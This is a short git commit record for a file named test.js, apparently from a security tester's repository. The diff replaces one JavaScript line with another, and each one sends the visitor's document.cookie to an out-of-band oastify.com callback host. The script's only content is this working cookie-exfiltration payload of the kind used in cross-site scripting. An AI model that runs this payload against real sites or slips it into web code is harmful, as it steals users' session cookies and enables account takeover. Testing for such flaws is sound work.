55aac8ce7532b30869c0ef832efbf43ab96e097a
Ben Sadeghipour <bensadeghi@gmail.com>
2023-03-06 11:44:35 -0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-window.location.replace("http://f7nn785xaiord4b6wllqsg2ix930rqff.oastify.com?test=" + document.cookie);
+document.location= 'https://f7nn785xaiord4b6wllqsg2ix930rqff.oastify.com?test=' + document.cookie;
